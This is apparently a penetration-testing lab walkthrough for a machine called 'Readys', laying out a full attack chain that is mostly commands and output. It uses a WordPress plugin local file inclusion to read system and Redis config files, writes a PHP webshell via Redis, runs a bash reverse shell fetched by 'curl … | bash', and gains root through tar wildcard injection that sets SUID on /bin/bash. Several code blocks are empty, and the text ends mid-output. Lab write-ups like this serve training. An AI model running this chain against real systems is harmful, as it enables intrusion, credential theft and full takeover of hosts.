# Exploitation Guide for Readys

## Summary

In this guide, we will use a WordPress plugin LFI vulnerability to gain access to a Redis service and then use the LFI and Redis access together to get a foothold on the system. We'll then abuse a cron backup script and wildcard injection to elevate to root access.

## Enumeration

### Nmap

We'll start by looking for open ports with an `nmap` scan.

```

```

We find a webserver on port 80, SSH service on port 22, and a Redis server on 6379.

### WordPress Enumeration

The webserver appears to be a WordPress site. Let's run `wpscan` to learn more about it.

## Exploitation

### Local File Inclusion Vulnerability

In the "Proof of Concept" section, we find the URI we can use to dump the contents of files on the target system. Let's test this by attempting to read **/etc/passwd**.

```
┌──(kali㉿kali)-[~]

{"success":true,"data":{"output":[]}}
```

That was successful! From our port scan, we saw a Redis server running on the target. Let's use this LFI to dump the Redis config file. It's likely we will find it at **/etc/redis/redis.conf**. The config file is large, so let's output it to a file.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.85/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf -o redis.conf

```

We'll search the file looking for words like "password". We come along a section that has an entry labeled "requirepass" with a value of `Ready4Redis?`.

```
...
################################## SECURITY ###################################

# Require clients to issue AUTH <PASSWORD> before processing any other
# commands.  This might be useful in environments in which you do not trust
# others with access to the host running redis-server.
#
# This should stay commented out for backward compatibility and because most
# people do not need auth (e.g. they run their own servers).
#
# Warning: since Redis is pretty fast an outside user can try up to
# 150k passwords per second against a good box. This means that you should
# use a very strong password otherwise it will be very easy to break.
#
requirepass Ready4Redis?
...
```

### Redis Enumeration

With this password, we can access the redis service. Let's install `redis-tools` and connect using `redis-cli` passing the password we just found.

```
┌──(kali㉿kali)-[~]
└─$ sudo apt install redis-tools
...
┌──(kali㉿kali)-[~]
└─$ redis-cli -h 192.168.120.85 -a Ready4Redis?
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
192.168.120.85:6379> ping
PONG
192.168.120.85:6379> 
```

We're connected. Maybe there is a way to gain a shell using redis. Searching the web, we find [this guide for Redis RCE](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-rce). The "Webshell" section may work for us, but we will have to know the path of the webroot.

Using the LFI vulnerability in WordPress, we can find the webroot by dumping **/etc/apache2/sites-enabled/000-default.conf**.

```

└─$ curl http://192.168.120.85/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/apache2/sites-enabled/000-default.conf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
{"success":true,"data":{"output":[]}}
```

According to this file, the webroot is at **/var/www/html**. Let's try to create a webshell there using our redis access.

```
192.168.120.85:6379> config set dir /var/www/html
OK
192.168.120.85:6379> config set dbfilename test.php
OK
192.168.120.85:6379> set test "<?php system('id'); ?>"
OK
192.168.120.85:6379> save
(error) ERR
192.168.120.85:6379> 
```

That didn't work. It appears that we don't have access to write to that directory. Perhaps the Redis service configuration will tell us where we can write to on the target system. Let's use the WordPress LFI to read **/etc/systemd/system/redis.service**.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.85/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/systemd/system/redis.service          
...

ReadWriteDirectories=-/etc/redis
ReadWriteDirectories=-/opt/redis-files

[Install]
WantedBy=multi-user.target
Alias=redis.service
{"success":true,"data":{"output":[]}}
```

This file lists two folders as "READWRITEDIRECTORIES", **/etc/redis** and **/opt/redis-files**. Let's attempt to write a test file using Redis to the **/opt/redis-files** path.

```
192.168.120.85:6379> config set dir /opt/redis-files
OK
192.168.120.85:6379> config set dbfilename test.php
OK
192.168.120.85:6379> set test "<?php system('id'); ?>"
OK
192.168.120.85:6379> save
OK
192.168.120.85:6379> 
```

We can then use the WordPress LFI to read this file. The contents will be in Redis RDB format so let's output it to a file and run `strings`.

```

 {"success":true,"data":{"output":[]}}
```

The output from the `id` command can be found in this file. This means we can execute a reverse shell using this method. Let's start by creating a file on our kali host named **shell.sh** with the following contents.

```bash
#!/bin/bash

/bin/bash -i >& /dev/tcp/192.168.118.14/9002 0>&1
```

Let's host this file using a python webserver to make it available to the target.

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We then need to start a listener to catch the reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9002
listening on [any] 9002 ...
```

Next, let's use our Redis session to cause the target to download and pipe **shell.sh** into `bash`.

```
192.168.120.85:6379> config set dir /opt/redis-files
OK
192.168.120.85:6379> config set dbfilename test.php
OK
192.168.120.85:6379> set test "<?php system('curl 192.168.118.14/shell.sh | bash'); ?>"
OK
```

Finally, we trigger our reverse shell by using the WordPress LFI.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.85/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/test.php
...
```

This command will hang, and we will receive a connection to our listener.

```
connect to [192.168.118.14] from (UNKNOWN) [192.168.120.85] 45752
bash: cannot set terminal process group (551): Inappropriate ioctl for device

<ite-editor/editor/extensions/pagebuilder/includes$ id
id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
<ite-editor/editor/extensions/pagebuilder/includes$ 
```

We now have shell access as the user `alice`.

## Escalation

### Cron Job Enumeration

With our shell access, we'll search the box and find a cron job that executes a script named **backup.sh** as root every three minutes.

```
<ite-editor/editor/extensions/pagebuilder/includes$ cat /etc/crontab
cat /etc/crontab                         
*/3 * * * * root /usr/local/bin/backup.sh
```

Let's take a look at this script to see if it could be useful to us.

```
<ite-editor/editor/extensions/pagebuilder/includes$ cat /usr/local/bin/backup.sh
cat /usr/local/bin/backup.sh                         
#!/bin/bash

cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi
```

This script checks for any files in the webroot that have been modified in the last three minutes. If any files are found, the webroot is backed up into a tar file using a wildcard "`*`".

We can check if alice has write access to the webroot using `ls` and it turns out that it is owned by alice.

```
<ite-editor/editor/extensions/pagebuilder/includes$ ls -l /var/www 
ls -l /var/www                         
total 4
drwxr-xr-x 5 alice alice 4096 Nov 17 10:21 html
```

### Wildcard Injection Vulnerability

With the cron backup script and our write access to the webroot, we can trick the `tar` command into running arbitrary commands as root using a wildcard injection. This works by using the `--checkpoint` and `--checkpoint-action` flags accepted by `tar`. If we create files in the webroot with names that are arguments for the `tar` command, they will be interpreted as arguments instead of filenames.

First, let's move into the webroot and create a file on the target named **exploit.sh** with a simple command to set SUID on **/bin/bash**.

```
<ite-editor/editor/extensions/pagebuilder/includes$ cd /var/www/html
cd /var/www/html
alice@readys:/var/www/html$ echo "chmod +s /bin/bash" > exploit.sh
echo "chmod +s /bin/bash" > exploit.sh
alice@readys:/var/www/html$ 
```

We then create two empty files using `touch`. The first will cause `tar` to cause a checkpoint on every file and the second will tell `tar` to execute our **exploit.sh** with `bash` on every checkpoint.

```
alice@readys:/var/www/html$ touch ./"--checkpoint=1"
touch ./"--checkpoint=1"
alice@readys:/var/www/html$ touch ./"--checkpoint-action=exec=bash exploit.sh"
touch ./"--checkpoint-action=exec=bash exploit.sh"
```

After a few minutes, we check if the cron job has run and if SUID is set on **/bin/bash**.

```
alice@readys:/var/www/html$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
alice@readys:/var/www/html$ 
```

We can now execute `bash` with SUID to gain a root shell on the target.

```
alice@readys:/var/www/html$ /bin/bash -p
/bin/bash -p
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
